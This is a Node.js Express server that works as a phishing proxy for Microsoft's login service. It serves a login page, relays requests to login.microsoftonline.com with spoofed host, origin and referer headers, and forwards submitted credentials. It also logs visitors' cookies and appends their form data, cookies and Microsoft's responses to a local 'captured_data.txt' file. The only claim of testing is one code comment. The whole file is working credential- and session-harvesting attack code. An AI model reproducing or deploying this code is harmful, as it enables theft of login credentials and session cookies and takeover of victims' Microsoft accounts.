const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const axios = require("axios");
const fs = require("fs");

const app = express();

// Middleware for parsing form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the login page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "myfile.html"));
  console.log("cookies:", req.headers.cookie);
});

//allows cors
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

// Intercept and proxy requests to Microsoft
// Log incoming requests for debugging
app.use((req, res, next) => {
  console.log("Incoming Request:", {
    method: req.method,
    path: req.path,
    headers: req.headers,
    body: req.body,
  });
  next();
});

// Proxy requests to Microsoft's endpoints
app.use("/common/*", async (req, res) => {
  try {
    const targetUrl = `https://login.microsoftonline.com${req.originalUrl}`;
    console.log("Target URL:", targetUrl);

    const modifiedBody = req.body && Object.keys(req.body).length > 0 ? req.body : { action: "default" };
    
    const response = await axios({
      method: req.method,
      url: targetUrl,
      headers: {
        ...req.headers,
        host: "login.microsoftonline.com",
        origin: "https://login.microsoftonline.com",
        referer: "https://login.microsoftonline.com",
      },
      data: modifiedBody,
      timeout: 15000, // 15 seconds timeout
    });

    console.log("Response Status:", response.status);
    console.log("Response Data:", response.data);

    res.status(response.status).send(response.data);
  } catch (error) {
    if (error.response) {
      console.log("Proxy Error (Response):", error.response.data);
    } else if (error.request) {
      console.log("Proxy Error (Request):", error.request);
    } else {
      console.log("Proxy Error (Other):", error.message);
    }
    res.status(500).send("Proxy error occurred.");
  }
});

// Handle form submission
app.post("/login", async (req, res) => {
  console.log("Incoming form data:", req.body);

  try {
    // Forward the form data to Microsoft
    const microsoftResponse = await axios.post(
      "https://login.microsoftonline.com/common/login",
      req.body,
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Cookie: req.headers.cookie || "",
          "User-Agent": req.headers["user-agent"],
          Referer: "https://login.microsoftonline.com",
          Origin: "https://login.microsoftonline.com",
        },
      }
    );

    console.log("Microsoft Response:", microsoftResponse.data);

    // Save captured data locally (for testing purposes)
    const logData = `Form Data: ${JSON.stringify(req.body)}\nCookies: ${
      req.headers.cookie
    }\nResponse: ${JSON.stringify(microsoftResponse.data)}\n\n`;
    fs.appendFileSync("captured_data.txt", logData);

    // Send Microsoft’s response back to the browser
    res.send(microsoftResponse.data);
  } catch (err) {
    console.error("Error:", err.response?.data || err.message);
    res
      .status(err.response?.status || 500)
      .send(err.response?.data || "Error forwarding request");
  }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
